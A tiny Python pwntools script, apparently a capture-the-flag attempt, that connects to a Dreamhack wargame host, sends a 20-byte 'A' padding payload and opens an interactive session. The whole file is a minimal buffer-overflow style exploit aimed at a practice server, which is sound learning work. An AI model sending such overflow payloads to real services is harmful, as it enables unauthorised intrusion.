from pwn import *

connection = remote('host1.dreamhack.games' , 19215) 

buf = b'A'*20
# age = b'0'
pload = buf

connection.sendline(pload)
connection.interactive()